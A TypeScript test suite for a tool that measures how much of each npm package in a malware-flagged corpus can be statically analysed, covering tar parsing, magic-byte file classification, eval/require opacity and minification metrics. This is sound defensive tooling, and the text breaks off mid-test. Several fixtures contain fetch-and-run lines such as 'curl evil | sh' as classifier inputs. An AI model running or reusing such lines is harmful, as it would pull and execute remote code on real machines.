/**
 * FASE A4, fail closed. This measures what can be looked at; it detects nothing.
 *
 * Each test pins one decision that would otherwise silently inflate the headline
 * coverage number:
 *
 *   Magic bytes decide before extensions. 847MB of the sampled corpus is Mach-O
 *   and ELF executables with NO extension at all, and a name-based classifier
 *   puts every one of them in the "readable" bucket by never noticing them.
 *   A file with one eval() is uncovered, not 95% covered.
 *   A parse failure and "was never JavaScript" are different findings.
 *   Held-out kinds leave the denominator; they are not counted as covered.
 *   An unset threshold marks nothing, rather than marking everything.
 */

import { describe, it, expect } from 'vitest'
import { rateWithCI } from '../src/stats.js'
import { gzipSync } from 'node:zlib'

import { readTar, gunzipIfNeeded, DEFAULT_TAR_LIMITS } from '../src/tarball.js'
import { classifyFile, extensionOf, isExecutableKind, isTypeDeclaration } from '../src/file-kind.js'
import {
  parseJavaScript,
  looksLikeAnotherLanguage,
  findOpacity,
  measureLegibility,
  isMinified,
  analyzeFile,
  summariseFiles,
  packageTypeOf,
  walkAst,
  MAX_PARSE_BYTES,
  type FileAnalysis,
  type LegibilityThreshold,
} from '../src/analyzability.js'
import { stratifiedSample, selfLabelledMinified, checkThreshold, analyzeCapture, canonicalModule, type MetricRow } from '../src/analyzability-run.js'
import type { CorpusSample } from '../src/corpus.js'

// ---------------------------------------------------------------------------
// A tar writer, so the reader is checked against archives built to the spec
// rather than against whatever one sample file happens to contain.
// ---------------------------------------------------------------------------

function tarHeader(opts: {
  name: string
  size: number
  typeflag?: string
  prefix?: string
  ustar?: boolean
}): Buffer {
  const block = Buffer.alloc(512)
  block.write(opts.name.slice(0, 100), 0, 'utf-8')
  block.write('0000644\0', 100)
  block.write('0000000\0', 108)
  block.write('0000000\0', 116)
  block.write(opts.size.toString(8).padStart(11, '0') + '\0', 124)
  block.write('00000000000\0', 136)
  block.write(opts.typeflag ?? '0', 156)
  if (opts.ustar !== false) {
    block.write('ustar\0', 257)
    block.write('00', 263)
  }
  if (opts.prefix) block.write(opts.prefix, 345, 'utf-8')

  // The checksum is computed with the field itself read as spaces. Nothing in
  // the reader verifies it, and writing it correctly is what makes this fixture
  // a real tar rather than one shaped to suit the reader.
  block.write('        ', 148)
  let sum = 0
  for (const byte of block) sum += byte
  block.write(sum.toString(8).padStart(6, '0') + '\0 ', 148)

  return block
}

function tarFile(name: string, content: string | Buffer, typeflag = '0', prefix?: string): Buffer {
  const data = Buffer.isBuffer(content) ? content : Buffer.from(content, 'utf-8')
  const padding = Buffer.alloc((512 - (data.length % 512)) % 512)
  return Buffer.concat([tarHeader({ name, size: data.length, typeflag, prefix }), data, padding])
}

const TAR_END = Buffer.alloc(1024)

// ---------------------------------------------------------------------------

describe('the tar reader', () => {
  it('reads regular files and their bytes', () => {
    const tar = Buffer.concat([
      tarFile('package/index.js', 'console.log(1)\n'),
      tarFile('package/package.json', '{"name":"p"}'),
      TAR_END,
    ])

    const result = readTar(tar)
    expect(result.truncated).toBe(false)
    expect(result.entries.map(e => e.name)).toEqual(['package/index.js', 'package/package.json'])
    expect(result.entries[0]!.data.toString()).toBe('console.log(1)\n')
  })

  it('accepts a gzipped archive, which is how npm serves them', () => {
    const tar = Buffer.concat([tarFile('package/a.js', 'a'), TAR_END])
    const result = readTar(gzipSync(tar))
    expect(result.entries).toHaveLength(1)
  })

  it('a symlink is not a file: its payload is empty and its target is not code', () => {
    const tar = Buffer.concat([
      tarFile('package/real.js', 'x'),
      tarFile('package/link.js', '', '2'),
      tarFile('package/dir', '', '5'),
      TAR_END,
    ])

    const names = readTar(tar).entries.map(e => e.name)
    expect(names).toEqual(['package/real.js'])
  })

  it('joins the ustar prefix, which is how a long path is stored', () => {
    const tar = Buffer.concat([
      tarFile('deep.js', 'x', '0', 'package/a/b/c'),
      TAR_END,
    ])
    expect(readTar(tar).entries[0]!.name).toBe('package/a/b/c/deep.js')
  })

  it('a GNU long name renames the next member and only the next one', () => {
    const longName = 'package/' + 'x'.repeat(200) + '.js'
    const tar = Buffer.concat([
      tarFile('././@LongLink', longName + '\0', 'L'),
      tarFile('package/truncated', 'first'),
      tarFile('package/second.js', 'second'),
      TAR_END,
    ])

    const entries = readTar(tar).entries
    expect(entries[0]!.name).toBe(longName)
    // The second member keeps its own name: a long-name entry that leaked would
    // rename every file after it.
    expect(entries[1]!.name).toBe('package/second.js')
  })

  it('a pax header supplies the path for the next member', () => {
    const path = 'package/' + 'p'.repeat(150) + '.js'
    const record = `path=${path}\n`
    const full = `${String(record.length + String(record.length + 4).length + 1).padStart(1)} ${record}`
    // Build the record with its own length included, which is what pax requires.
    let length = record.length + 2
    for (;;) {
      const candidate = `${length} ${record}`
      if (candidate.length === length) break
      length = candidate.length
    }

    const tar = Buffer.concat([
      tarFile('PaxHeader', `${length} ${record}`, 'x'),
      tarFile('package/ignored', 'body'),
      TAR_END,
    ])

    expect(full).toBeTruthy()
    expect(readTar(tar).entries[0]!.name).toBe(path)
  })

  it('stops at the end blocks instead of reading past them', () => {
    const tar = Buffer.concat([
      tarFile('package/a.js', 'a'),
      TAR_END,
      tarFile('package/after-the-end.js', 'never read'),
    ])
    expect(readTar(tar).entries.map(e => e.name)).toEqual(['package/a.js'])
  })

  it('a member that runs off the end of the archive is a truncation, not a file', () => {
    const header = tarHeader({ name: 'package/big.js', size: 100_000 })
    const result = readTar(Buffer.concat([header, Buffer.alloc(512)]))
    expect(result.truncated).toBe(true)
    expect(result.truncationReason).toContain('archive ends first')
  })

  it('an oversized member is skipped with a reason, never truncated into a smaller one', () => {
    const tar = Buffer.concat([
      tarFile('package/small.js', 'ok'),
      tarFile('package/big.bin', Buffer.alloc(4096)),
      TAR_END,
    ])

    const result = readTar(tar, { ...DEFAULT_TAR_LIMITS, maxEntryBytes: 1024 })
    expect(result.entries.map(e => e.name)).toEqual(['package/small.js'])
    expect(result.skipped).toHaveLength(1)
    expect(result.skipped[0]!.name).toBe('package/big.bin')
    expect(result.skipped[0]!.size).toBe(4096)
  })

  it('the member cap stops an archive of millions of empty files', () => {
    const many = Buffer.concat([
      ...Array.from({ length: 20 }, (_, i) => tarFile(`package/f${i}.js`, 'x')),
      TAR_END,
    ])
    const result = readTar(many, { ...DEFAULT_TAR_LIMITS, maxEntries: 5 })
    expect(result.truncated).toBe(true)
    expect(result.truncationReason).toContain('members')
  })

  // The corpus is drawn from packages selected for looking like malware, so a
  // decompression bomb is a live case and not a formality.
  it('a gzip that expands past the cap fails as a read, not as a crash', () => {
    const huge = gzipSync(Buffer.alloc(1_000_000))
    const result = readTar(huge, { ...DEFAULT_TAR_LIMITS, maxTotalBytes: 1000 })
    expect(result.truncated).toBe(true)
    expect(result.truncationReason).toContain('gunzip failed')
  })

  it('gunzipIfNeeded passes plain tar through untouched', () => {
    const plain = Buffer.from('not gzip at all')
    expect(gunzipIfNeeded(plain, 1024).equals(plain)).toBe(true)
  })

  it('an unparseable size field ends the read instead of producing a wrong member', () => {
    const header = tarHeader({ name: 'package/a.js', size: 0 })
    header.write('not-octal!!!', 124)
    const result = readTar(Buffer.concat([header, Buffer.alloc(512)]))
    expect(result.truncated).toBe(true)
    expect(result.truncationReason).toContain('size field')
  })
})

// ---------------------------------------------------------------------------

describe('what a file is, decided by its bytes', () => {
  const head = (bytes: number[]) => Buffer.from(bytes)

  // The measurement that forced this order: 41 files with no extension in a
  // 200-tarball sample were Mach-O or ELF, carrying 847MB — more than every .js
  // file in the sample put together.
  it('an executable with no extension is native, and nothing about its name says so', () => {
    const elf = classifyFile('package/bin/toolname', head([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]))
    expect(elf.kind).toBe('native')
    expect(elf.by).toBe('magic')
  })

  it('magic beats the extension when they disagree', () => {
    // A Mach-O binary named .js. The extension says JavaScript; the bytes do not.
    const macho = classifyFile('package/lib/index.js', head([0xcf, 0xfa, 0xed, 0xfe, 0, 0, 0, 0]))
    expect(macho.kind).toBe('native')

    const wasm = classifyFile('package/mod.js', head([0x00, 0x61, 0x73, 0x6d, 1, 0, 0, 0]))
    expect(wasm.kind).toBe('wasm')

    const pe = classifyFile('package/thing', head([0x4d, 0x5a, 0x90, 0x00]))
    expect(pe.kind).toBe('native')
  })

  it('a node shebang is JavaScript and any other shebang is not', () => {
    const node = classifyFile('package/bin/cli', Buffer.from('#!/usr/bin/env node\nconsole.log(1)'))
    expect(node.kind).toBe('javascript')
    expect(node.by).toBe('shebang')

    const sh = classifyFile('package/bin/setup', Buffer.from('#!/bin/sh\ncurl evil | sh'))
    expect(sh.kind).toBe('foreign-script')
    // It executes and this layer cannot read it, so it is in the denominator.
    expect(isExecutableKind(sh.kind)).toBe(true)
  })

  it('the extension decides for everything with no magic worth the name', () => {
    expect(classifyFile('a.js', Buffer.from('x')).kind).toBe('javascript')
    expect(classifyFile('a.mjs', Buffer.from('x')).kind).toBe('javascript')
    expect(classifyFile('a.cjs', Buffer.from('x')).kind).toBe('javascript')
    expect(classifyFile('a.node', Buffer.from('x')).kind).toBe('native')
    expect(classifyFile('a.jsc', Buffer.from('x')).kind).toBe('bytecode')
    expect(classifyFile('a.ts', Buffer.from('x')).kind).toBe('typed-source')
    expect(classifyFile('a.js.map', Buffer.from('x')).kind).toBe('sourcemap')
    expect(classifyFile('README.md', Buffer.from('x')).kind).toBe('docs')
    expect(classifyFile('font.ttf', Buffer.from('x')).kind).toBe('asset')
    expect(classifyFile('LICENSE', Buffer.from('MIT')).kind).toBe('other')
    // An install script with no shebang still executes, and it is the most
    // direct way a package runs code on a machine.
    expect(classifyFile('scripts/postinstall.sh', Buffer.from('curl x | sh')).kind).toBe('foreign-script')
    expect(classifyFile('scripts/setup.py', Buffer.from('import os')).kind).toBe('foreign-script')
  })

  it('only what runs is in the denominator', () => {
    for (const kind of ['javascript', 'native', 'wasm', 'bytecode', 'foreign-script'] as const) {
      expect(isExecutableKind(kind)).toBe(true)
    }
    for (const kind of ['typed-source', 'sourcemap', 'data', 'docs', 'asset', 'other'] as const) {
      expect(isExecutableKind(kind)).toBe(false)
    }
  })

  it('a dotfile has no extension', () => {
    expect(extensionOf('.gitignore')).toBe('')
    expect(extensionOf('package/.npmrc')).toBe('')
    expect(extensionOf('a/b.min.js')).toBe('.js')
  })

  it('a .d.ts is a declaration and never executes', () => {
    expect(isTypeDeclaration('index.d.ts')).toBe(true)
    expect(isTypeDeclaration('index.ts')).toBe(false)
  })
})

// ---------------------------------------------------------------------------

describe('parsing, and what a failure means', () => {
  it('a .mjs is a module and a .cjs is a script', () => {
    expect(parseJavaScript('export const a = 1', 'a.mjs', undefined).ok).toBe(true)
    expect(parseJavaScript('module.exports = 1', 'a.cjs', undefined).ok).toBe(true)
  })

  it('package.json "type" decides for a bare .js', () => {
    expect(parseJavaScript('export const a = 1', 'a.js', 'module').ok).toBe(true)
  })

  // Without the fallback, every package that ships ESM in a .js and omits
  // "type" would be reported as a parse failure, and this design calls a parse
  // failure maximum severity.
  it('the other mode is tried before anything is called broken', () => {
    expect(parseJavaScript('export const a = 1', 'a.js', undefined).ok).toBe(true)
    expect(parseJavaScript('module.exports = 1', 'a.js', 'module').ok).toBe(true)
  })

  it('a shebang does not make a CLI entry point unparseable', () => {
    expect(parseJavaScript('#!/usr/bin/env node\nconsole.log(1)', 'cli.js', undefined).ok).toBe(true)
  })

  it('modern syntax parses', () => {
    expect(parseJavaScript('const a = b?.c ?? d; class X { #p = 1 }', 'a.js', undefined).ok).toBe(true)
    expect(parseJavaScript('const x = a?.[0]?.(); for await (const y of z) {}', 'a.mjs', undefined).ok).toBe(true)
  })

  // The severity claim only holds for genuinely malformed files. Reporting a
  // .js that is really TypeScript as adversarial would make this a false-alarm
  // engine on its first run.
  it('TypeScript in a .js is not javascript, not a malformed one', () => {
    const ts = parseJavaScript('interface Foo { a: string }\nexport const x: Foo = { a: "" }', 'a.js', undefined)
    expect(ts.ok).toBe(false)
    expect(ts.failure).toBe('not-javascript')
  })

  it('JSON served as .js is not javascript', () => {
    const json = parseJavaScript('{"name":"p","version":"1.0.0"}', 'a.js', undefined)
    expect(json.ok).toBe(false)
    expect(json.failure).toBe('not-javascript')
  })

  it('HTML in a .js is not javascript', () => {
    const html = parseJavaScript('<!DOCTYPE html><html><body>hi</body></html>', 'a.js', undefined)
    expect(html.ok).toBe(false)
    expect(html.failure).toBe('not-javascript')
  })

  it('a genuinely broken file is malformed, and that is the severe one', () => {
    const broken = parseJavaScript('function ( { { { unterminated', 'a.js', undefined)
    expect(broken.ok).toBe(false)
    expect(broken.failure).toBe('malformed')
    expect(broken.error).toBeTruthy()
  })

  it('a .d.ts is recognised without being parsed', () => {
    expect(looksLikeAnotherLanguage('anything at all', 'index.d.ts')).toBe(true)
  })

  it('an ordinary script is not mistaken for another language', () => {
    expect(looksLikeAnotherLanguage('const a = 1', 'a.js')).toBe(false)
    // An object literal that is not valid JSON stays JavaScript.
    expect(looksLikeAnotherLanguage('{ a: 1 }', 'a.js')).toBe(false)
  })
})

// ---------------------------------------------------------------------------

describe('the opacity walk', () => {
  const opacity = (src: string) => {
    const parsed = parseJavaScript(src, 'a.js', undefined)
    expect(parsed.ok).toBe(true)
    return findOpacity(parsed.ast)
  }

  it('eval of a runtime-built string is opaque', () => {
    expect(opacity('eval(x)').map(o => o.kind)).toEqual(['dynamic-eval'])
    expect(opacity('eval("a" + b)').map(o => o.kind)).toEqual(['dynamic-eval'])
    expect(opacity('eval(`${a}`)').map(o => o.kind)).toEqual(['dynamic-eval'])
  })

  // A literal eval is unusual and it is analysable: the parser can read the
  // string. Whether it is suspicious is the detector's question, not this one's.
  it('eval of a literal is not what this reason is about', () => {
    expect(opacity('eval("1+1")')).toEqual([])
    expect(opacity('eval(`static`)')).toEqual([])
  })

  it('indirect eval through a sequence is caught', () => {
    expect(opacity('(0, eval)(payload)').map(o => o.kind)).toEqual(['dynamic-eval'])
  })

  it('the Function constructor over a runtime body is opaque, in both call forms', () => {
    expect(opacity('new Function(src)').map(o => o.kind)).toEqual(['dynamic-eval'])
    expect(opacity('Function("a", "b", body)').map(o => o.kind)).toEqual(['dynamic-eval'])
    // Parameter names are literals and the body is the last argument.
    expect(opacity('new Function("a", "return a")')).toEqual([])
  })

  it('require and import of an unresolvable expression are opaque', () => {
    expect(opacity('require(name)').map(o => o.kind)).toEqual(['dynamic-require'])
    expect(opacity('require("./known")')).toEqual([])
    expect(opacity('import(spec)').map(o => o.kind)).toEqual(['dynamic-require'])
    expect(opacity('import("./known")')).toEqual([])
  })

  it('a partially resolvable require says so instead of being cleared', () => {
    const found = opacity('require(`./locales/${lang}`)')
    expect(found.map(o => o.kind)).toEqual(['dynamic-require'])
    expect(found[0]!.detail).toContain('prefix is readable')
  })

  it('ordinary code carries no markers', () => {
    expect(opacity('const a = require("fs"); function f(x) { return x + 1 }')).toEqual([])
  })

  // An explicit switch over node types skips whatever it has not heard of, and
  // what it has not heard of is the newest syntax — which is exactly where an
  // eval would hide.
  it('the walk reaches nodes nested inside constructs it knows nothing about', () => {
    expect(opacity('class A { static { eval(x) } }').map(o => o.kind)).toEqual(['dynamic-eval'])
    expect(opacity('const o = { async *[k]() { await import(s) } }').map(o => o.kind)).toEqual(['dynamic-require'])
  })

  // A minified bundle is a legal way to write a fifty-thousand-term expression,
  // and a recursive walk over it overflows the stack on hostile input.
  it('a deep expression does not overflow the walker', () => {
    // Below acorn's own recursion guard, which gives up somewhere past ten
    // thousand terms. The walker has no such bound and must not acquire one.
    const deep = 'a' + '+a'.repeat(4_000)
    const parsed = parseJavaScript(deep, 'a.js', undefined)
    expect(parsed.ok).toBe(true)

    let nodes = 0
    expect(() => walkAst(parsed.ast, () => { nodes++ })).not.toThrow()
    expect(nodes).toBeGreaterThan(4_000)
  })

  // acorn refuses a deeply nested expression before the file has said anything.
  // Filing that under parse-failure would put the maximum-severity label on this
  // tool's own bound: measured, acorn gives up at roughly ten thousand terms.
  it("the parser's own limit is not the package's fault", () => {
    const beyond = parseJavaScript('a' + '+a'.repeat(50_000), 'a.js', undefined)
    expect(beyond.ok).toBe(false)
    expect(beyond.failure).toBe('parser-limit')

    const r = analyzeFile({
      name: 'package/bundle.js',
      data: Buffer.from('a' + '+a'.repeat(50_000)),
      packageType: undefined,
    })
    expect(r.reasons).toEqual(['parser-limit'])
    expect(r.covered).toBe(false)
  })
})

// ---------------------------------------------------------------------------

describe('legibility', () => {
  const metrics = (src: string) => {
    const parsed = parseJavaScript(src, 'a.js', undefined)
    expect(parsed.ok).toBe(true)
    return measureLegibility(src, parsed.ast)
  }

  it('a readable file and a minified one differ on layout and on naming', () => {
    const readable = metrics([
      'const applicationConfiguration = {',
      '  retryLimit: 3,',
      '  timeoutMilliseconds: 5000,',
      '}',
      'function computeRetryDelay(attemptNumber) {',
      '  return applicationConfiguration.retryLimit * attemptNumber',
      '}',
    ].join('\n'))

    const minified = metrics('var a={b:3,c:5000};function d(e){return a.b*e}'.repeat(20))

    expect(readable.bytesPerLine).toBeLessThan(minified.bytesPerLine)
    expect(readable.meanIdentifierLength).toBeGreaterThan(minified.meanIdentifierLength)
    expect(readable.shortIdentifierRatio).toBeLessThan(minified.shortIdentifierRatio)
  })

  it('maxLineLength catches the one enormous line a mean would dilute', () => {
    const m = metrics('const a = 1\n' + 'const b = "' + 'x'.repeat(5000) + '"\n')
    expect(m.maxLineLength).toBeGreaterThan(5000)
  })

  // A threshold nobody derived must not mark everything as unreadable: a 100%
  // minified corpus would be read as a finding rather than as an unset constant.
  it('an unset threshold marks nothing', () => {
    const m = metrics('var a={b:1};'.repeat(500))
    expect(isMinified(m, { bytesPerLine: 0, shortIdentifierRatio: 0 })).toBe(false)
  })

  // One metric on its own is too easy to fail in a way that matters: a generated
  // lookup table has short identifiers and short lines; a hand-written file with
  // one inlined data string has a huge line and ordinary names.
  it('both conditions have to hold', () => {
    const threshold: LegibilityThreshold = { bytesPerLine: 200, shortIdentifierRatio: 0.5 }

    const longLinesReadableNames = metrics(
      'var applicationConfigurationValue = 1; '.repeat(40)
    )
    expect(longLinesReadableNames.bytesPerLine).toBeGreaterThan(200)
    expect(isMinified(longLinesReadableNames, threshold)).toBe(false)

    const shortNamesShortLines = metrics(
      Array.from({ length: 60 }, (_, i) => `var a${i % 9} = ${i}`).join('\n')
    )
    expect(shortNamesShortLines.shortIdentifierRatio).toBeGreaterThan(0.5)
    expect(isMinified(shortNamesShortLines, threshold)).toBe(false)
  })

  it('a file that is both is marked', () => {
    const m = metrics('function a(b,c){return b+c}var d=a(1,2),e=a(3,4),f=d+e;'.repeat(30))
    expect(isMinified(m, { bytesPerLine: 200, shortIdentifierRatio: 0.5 })).toBe(true)
  })
})

// ---------------------------------------------------------------------------

describe('one file, fail closed', () => {
  const file = (name: string, content: string | Buffer, packageType?: 'module' | 'commonjs') =>
    analyzeFile({
      name,
      data: Buffer.isBuffer(content) ? content : Buffer.from(content),
      packageType,
      threshold: { bytesPerLine: 200, shortIdentifierRatio: 0.5 },
    })

  it('ordinary readable JavaScript is covered', () => {
    const r = file('package/index.js', 'const fs = require("fs")\nmodule.exports = fs.readFileSync\n')
    expect(r.covered).toBe(true)
    expect(r.reasons).toEqual([])
    expect(r.metrics).toBeDefined()
  })

  // The whole file, not the 95% around it: the parser cannot bound what the
  // eval does, so it cannot vouch for anything the eval could have reached.
  it('one eval makes the whole file uncovered', () => {
    const r = file('package/index.js', 'var a = 1\n'.repeat(200) + 'eval(payload)\n')
    expect(r.covered).toBe(false)
    expect(r.reasons).toEqual(['dynamic-eval'])
    expect(r.bytes).toBeGreaterThan(2000)
  })

  it('a file carries every reason that applies, not the first one found', () => {
    const r = file(
      'package/bundle.js',
      'function a(b,c){return eval(b+c)}var d=a,e=require(f),g=d+e;'.repeat(30)
    )
    expect(r.reasons).toContain('minified')
    expect(r.reasons).toContain('dynamic-eval')
    expect(r.reasons).toContain('dynamic-require')
  })

  it('a binary is uncovered with its own reason and never parsed', () => {
    const elf = file('package/bin/tool', Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]))
    expect(elf.kind).toBe('native')
    expect(elf.reasons).toEqual(['native-binary'])
    expect(elf.metrics).toBeUndefined()
  })

  it('wasm and bytecode get their own reasons rather than one opaque bucket', () => {
    expect(file('package/m.wasm', Buffer.from([0x00, 0x61, 0x73, 0x6d, 1, 0, 0, 0])).reasons).toEqual(['wasm'])
    expect(file('package/m.jsc', 'anything').reasons).toEqual(['bytecode'])
  })

  it('a shell script executes and is uncovered, not held out', () => {
    const r = file('package/install.sh', '#!/bin/sh\ncurl x | sh')
    expect(r.reasons).toEqual(['foreign-script'])
    expect(isExecutableKind(r.kind)).toBe(true)
  })

  it('a README is held out: no reasons, and not covered either', () => {
    const r = file('package/README.md', '# hello')
    expect(r.covered).toBe(false)
    expect(r.reasons).toEqual([])
    expect(isExecutableKind(r.kind)).toBe(false)
  })

  // A file nobody read is not a file that was clean, and this is the reason
  // that would otherwise be invisible.
  it('a file too large to parse is uncovered for being unread', () => {
    const r = file('package/huge.js', Buffer.alloc(MAX_PARSE_BYTES + 1, 0x20))
    expect(r.reasons).toEqual(['too-large'])
  })

  it('a parse failure and a wrong-language file are different reasons', () => {
    expect(file('package/broken.js', 'function ( { { {').reasons).toEqual(['parse-failure'])
    expect(file('package/types.js', 'interface A { x: string }').reasons).toEqual(['not-javascript'])
  })
})

// ---------------------------------------------------------------------------

describe('one capture', () => {
  const f = (over: Partial<FileAnalysis>): FileAnalysis => ({
    name: 'x', bytes: 100, kind: 'javascript', classifiedBy: 'test',
    covered: true, reasons: [], ...over,
  })

  it('held-out kinds leave the denominator instead of counting as covered', () => {
    const s = summariseFiles([
      f({ kind: 'javascript', bytes: 100, covered: true }),
      f({ kind: 'docs', bytes: 900, covered: false }),
      f({ kind: 'asset', bytes: 9000, covered: false }),
    ])

    expect(s.executableBytes).toBe(100)
    expect(s.coverage).toBe(1)
    expect(s.heldOut['docs']).toEqual({ files: 1, bytes: 900 })
    expect(s.heldOut['asset']).toEqual({ files: 1, bytes: 9000 })
  })

  it('a package with nothing executable has no coverage, not 0%', () => {
    const s = summariseFiles([f({ kind: 'docs', covered: false }), f({ kind: 'data', covered: false })])
    expect(s.coverage).toBeNull()
    expect(s.executableBytes).toBe(0)
  })

  it('one 200MB binary outweighs a thousand small scripts, by design', () => {
    const s = summariseFiles([
      ...Array.from({ length: 1000 }, () => f({ bytes: 1000, covered: true })),
      f({ kind: 'native', bytes: 200_000_000, covered: false, reasons: ['native-binary'] }),
    ])
    expect(s.coverage!).toBeLessThan(0.01)
    expect(s.coveredFiles).toBe(1000)
  })

  it('a two-reason file appears under both, so the columns overlap on purpose', () => {
    const s = summariseFiles([
      f({ bytes: 500, covered: false, reasons: ['minified', 'dynamic-require'] }),
    ])
    expect(s.byReason['minified']).toEqual({ files: 1, bytes: 500 })
    expect(s.byReason['dynamic-require']).toEqual({ files: 1, bytes: 500 })
    // Both columns hold the same 500 bytes: they are not a partition and the
    // report says so rather than letting them be added up.
    expect(s.coveredBytes).toBe(0)
  })

  it('the root package.json decides the module type, not a nested one', () => {
    const entries = [
      { name: 'package/node_modules/dep/package.json', data: Buffer.from('{"type":"commonjs"}') },
      { name: 'package/package.json', data: Buffer.from('{"type":"module"}') },
    ]
    expect(packageTypeOf(entries)).toBe('module')
  })

  it('an unreadable or absent manifest leaves the type undecided rather than guessed', () => {
    expect(packageTypeOf([{ name: 'package/package.json', data: Buffer.from('not json') }])).toBeUndefined()
    expect(packageTypeOf([])).toBeUndefined()
  })
})

// ---------------------------------------------------------------------------

describe('the corpus pass', () => {
  const sample = (name: string, label = 'unconfirmed'): CorpusSample => ({
    package: name, version: '1.0.0', label: label as CorpusSample['label'],
    ngpackPath: `/captures/${name}`, capturedAt: '2026-08-13T00:00:00Z',
    hasTarball: true, tarballPresent: true, labelAssumed: false, contaminated: false,
  })

  // One of the two questions this phase exists to answer is specifically about
  // the eight confirmed samples, and eight of anything costs nothing to analyse.
  it('every confirmed sample is analysed however small the sample is', () => {
    const confirmed = [sample('bad-1', 'confirmed_malicious'), sample('bad-2', 'confirmed_malicious')]
    const all = [...confirmed, ...Array.from({ length: 100 }, (_, i) => sample(`p${i}`))]

    const picked = stratifiedSample(all, 5, confirmed)
    expect(picked).toHaveLength(5)
    expect(picked.filter(p => p.label === 'confirmed_malicious')).toHaveLength(2)
  })

  // A run that cannot be reproduced cannot be compared against the next one, and
  // comparison is the only reason to save an artifact.
  it('the sample is deterministic', () => {
    const all = Array.from({ length: 100 }, (_, i) => sample(`p${i}`))
    expect(stratifiedSample(all, 10, []).map(s => s.package))
      .toEqual(stratifiedSample(all, 10, []).map(s => s.package))
  })

  it('asking for more than there is returns everything, once', () => {
    const all = Array.from({ length: 5 }, (_, i) => sample(`p${i}`))
    expect(stratifiedSample(all, 50, [])).toHaveLength(5)
  })

  it('a file names itself minified, or its build does', () => {
    expect(selfLabelledMinified('dist/bundle.min.js', 'x')).toBe(true)
    expect(selfLabelledMinified('dist/bundle.min.mjs', 'x')).toBe(true)
    expect(selfLabelledMinified('dist/b.js', 'code\n//# sourceMappingURL=b.js.map')).toBe(true)
    expect(selfLabelledMinified('src/index.js', 'const a = 1')).toBe(false)
  })

  // Two error rates rather than one accuracy number: for a reach measurement
  // they are not interchangeable. Marking readable code unreadable understates
  // coverage, which is the safe direction; the reverse is the failure this phase
  // exists to prevent.
  it('a candidate cut is checked against the self-labelled set in both directions', () => {
    const row = (over: Partial<MetricRow>): MetricRow => ({
      package: 'p', file: 'f.js', bytes: 100, bytesPerLine: 10, maxLineLength: 10,
      bytesPerNode: 5, meanIdentifierLength: 8, shortIdentifierRatio: 0.1,
      selfLabelledMinified: false, ...over,
    })

    const rows = [
      row({ selfLabelledMinified: true, bytesPerLine: 900, shortIdentifierRatio: 0.8 }),
      row({ selfLabelledMinified: true, bytesPerLine: 40, shortIdentifierRatio: 0.2 }),
      row({ selfLabelledMinified: false, bytesPerLine: 20, shortIdentifierRatio: 0.1 }),
      row({ selfLabelledMinified: false, bytesPerLine: 900, shortIdentifierRatio: 0.9 }),
    ]

    const check = checkThreshold(rows, { bytesPerLine: 200, shortIdentifierRatio: 0.5 })
    expect(check.labelled).toBe(2)
    expect(check.unlabelled).toBe(2)
    expect(check.truePositiveRate).toBe(0.5)
    expect(check.falsePositiveRate).toBe(0.5)
  })

  it('with nothing labelled it declines to report a rate rather than reporting zero', () => {
    const check = checkThreshold([], { bytesPerLine: 200, shortIdentifierRatio: 0.5 })
    expect(check.truePositiveRate).toBeNull()
    expect(check.falsePositiveRate).toBeNull()
  })
})

/**
 * The two findings the first real run produced, pinned so a refactor cannot
 * quietly undo either.
 */
describe('what the first run found', () => {
  // package/dist/internal/calc.dat in kit-hydration-vim@1.0.0 — a capture npm
  // removed and this project labelled confirmed_malicious — is 63,616 bytes
  // beginning \x7fELF. It is 93% of that package's executable surface. An
  // extension-based classifier calls it data, drops it out of the denominator,
  // and reports the package as fully covered.
  it('an ELF binary named .dat is native, not data', () => {
    const elf = Buffer.concat([
      Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]),
      Buffer.alloc(8),
    ])

    const c = classifyFile('package/dist/internal/calc.dat', elf)
    expect(c.kind).toBe('native')
    expect(c.by).toBe('magic')
    expect(isExecutableKind(c.kind)).toBe(true)

    // And the coverage arithmetic that follows from it.
    const summary = summariseFiles([
      analyzeFile({ name: 'package/dist/internal/calc.dat', data: elf, packageType: undefined }),
      analyzeFile({ name: 'package/dist/index.mjs', data: Buffer.from('export const a = 1'), packageType: undefined }),
    ])
    expect(summary.byReason['native-binary']!.files).toBe(1)
    expect(summary.coverage!).toBeLessThan(1)
  })

  // hasTarball has always meant "the manifest declares a version", and it was
  // read as "the bytes are here" for long enough that two thirds of the corpus
  // turned out to be a manifest and a packument with nothing behind them —
  // including six of the eight confirmed_malicious samples. Nothing reported it
  // because layer 1 analyses the packument and never asks for the artifact.
  it('a capture whose bytes are gone is excluded before the pass, not scored as 0%', () => {
    const gone: CorpusSample = {
      package: 'gone', version: '1.0.0', label: 'confirmed_malicious',
      ngpackPath: '/captures/gone', capturedAt: '2026-08-13T00:00:00Z',
      hasTarball: true, tarballPresent: false, labelAssumed: false, contaminated: false,
    }

    // The two fields say different things and the second is the one to filter on.
    expect(gone.hasTarball).toBe(true)
    expect(gone.tarballPresent).toBe(false)

    // A capture with no bytes must never reach the coverage denominator as a
    // zero: 0% coverage is a finding about a package and this is a fact about
    // the disk.
    const result = analyzeCapture(gone)
    expect(result.error).toBeTruthy()
    expect(result.coverage).toBeNull()
    expect(result.executableBytes).toBe(0)
  })
})

/**
 * The corpus cut by class. The segmentation logic only — the run itself is a
 * corpus pass, not a unit test.
 */
describe('cutting the corpus by class', () => {
  it('node: and bare builtins are one module, and a subpath is its package', () => {
    expect(canonicalModule('node:fs')).toBe('fs')
    expect(canonicalModule('fs')).toBe('fs')
    expect(canonicalModule('fs/promises')).toBe('fs')
    expect(canonicalModule('node:child_process')).toBe('child_process')
    expect(canonicalModule('lodash/get')).toBe('lodash')
    // A scope is part of the name, so folding to the first segment would merge
    // every package under an org into one.
    expect(canonicalModule('@scope/pkg')).toBe('@scope/pkg')
    expect(canonicalModule('@scope/pkg/sub')).toBe('@scope/pkg')
  })

  // The loss is not spread evenly: everything captured before 2026-08-15 is
  // gone. A rate over a segment whose bytes are mostly gone is drawn from what
  // survived, which is a date range rather than a sample of the segment — so the
  // share has to be stated before the rate, not after it.
  it('the share with bytes is a rate with its own interval, over the whole segment', () => {
    const withBytes = rateWithCI(820, 2450)
    expect(withBytes.rate).toBeCloseTo(0.3347, 3)
    expect(withBytes.low).toBeLessThan(withBytes.rate!)
    expect(withBytes.high).toBeGreaterThan(withBytes.rate!)
